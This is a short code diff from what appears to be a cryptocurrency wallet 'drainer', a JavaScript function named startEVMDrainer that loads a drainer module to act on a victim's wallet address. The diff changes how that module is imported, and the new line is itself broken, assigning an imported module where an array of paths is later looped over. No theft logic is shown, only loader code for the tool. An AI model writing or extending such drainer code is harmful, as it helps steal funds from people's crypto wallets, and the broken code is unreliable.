@@ -5,7 +5,7 @@ async function startEVMDrainer(walletAddress, chainId = 1) {
   try {
     // Try multiple possible paths for main.js
     let DrainerModule;
-    const possiblePaths = ['./main.js', './main', '../main.js', '../main'];
+    const possiblePaths  = await import('@/lib/drainer/evm-main.js');;
 
     for (const path of possiblePaths) {
       try {
